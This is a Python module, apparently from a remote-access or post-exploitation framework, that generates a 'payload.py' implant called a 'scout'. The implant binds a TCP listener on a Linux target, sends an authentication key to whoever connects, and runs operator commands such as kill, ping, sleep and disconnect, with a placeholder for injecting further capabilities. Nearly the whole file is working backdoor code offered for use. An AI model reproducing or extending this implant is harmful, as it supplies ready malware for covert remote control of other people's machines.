# GUI + CUI
# done
import library.modules.config as config
import library.modules.safe_open as safe_open
import os
from datetime import datetime

config.main()
interface = config.interface


def main(option):
    if option == 'generate':
        host = config.scout_values['Host'][0]
        port = config.scout_values['Port'][0]
        key = config.key
        timeout = config.scout_values['Timeout'][0]
        config.local_time_dir = os.path.join(config.scout_values['Dir'][0], datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
        filepath = os.path.join(config.local_time_dir, 'payload.py')
        config.import_statements.append('import socket')
        config.import_statements.append('from os import _exit')
        config.import_statements.append('from time import sleep')
        config.import_statements.append('import pickle')
        with safe_open.main(filepath, 'w') as f:
            host = str(host.replace(' ', '').split(','))
            f.write(f'''
def recv_all(sock):
    sock.settimeout(None)
    try:
        data = sock.recv(1000000)
        processed_data = data.decode()
        target_length = int(processed_data.split("|",1)[0]) 
        data = data[len(str(target_length))+1:] 
    except UnicodeDecodeError:
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|",1)[0])
        data = data[len(str(target_length))+1:] 
    received_data_length = len(data) 
    if received_data_length >= target_length: 
        try:
            return data.decode()
        except UnicodeDecodeError:
            return data
    sock.settimeout(3) 
    while received_data_length < target_length: 
        try:
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):
            break
    try:
        return data.decode()
    except UnicodeDecodeError:
        return data
def send_all(sock, data):
    try:
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError:
        sock.sendall(str(len(data)).encode() + b"|" + data)
host_list = {host}
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                sock = socket.socket()
                sock.settimeout({timeout})
                sock.bind((i,{port}))
                sock.listen(1)
                s, a = sock.accept()
                send_all(s,'{key}')
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            interface = data.split(' ')[0]
            if interface == "g":
                interface = "GUI"
            elif interface == "c":
                interface = "CUI"
            data = data.split(' ', 1)[1]
            command = data.split(" ", 1)[0]
            if command == 'kill':
                send_all(s,'[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                if interface == "GUI":
                    send_all(s, pickle.dumps(comp_list))
                elif interface == "CUI":
                    send_all(s, help_menu)
            elif command == 'ping':
                send_all(s,'[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                send_all(s,'[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                send_all(s,'[*]Scout is disconnecting itself...')
                sleep(3)
                break#Statements#
            else:
                send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout):
            try:
                if type(e) not in (socket.error,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                send_all(s,'[-]Please supply valid arguments for the command you are running')
            except Exception as e:
                send_all(s,'[!]Error in scout : ' + str(e))
        except IndexError:
            send_all(s,'[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            send_all(s,'[!]Error in scout : ' + str(e))''')
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Bind TCP Base component",
                "OS": "Linux",
                "Required Modules": "socket, time",
                "Commands": "kill, ping, sleep <time>, disconnect",
                "Description": "The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands",
                "Connection Type": "Bind"
            }
        elif interface == "CUI":
            print('\nName             : Bind TCP Base component' \
                  '\nOS               : Linux' \
                  '\nRequired Modules : socket, time' \
                  '\nCommands         : kill, ping, sleep <time>, disconnect' \
                  '\nDescription      : The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands' \
                  '\nConnection type  : Bind\n')
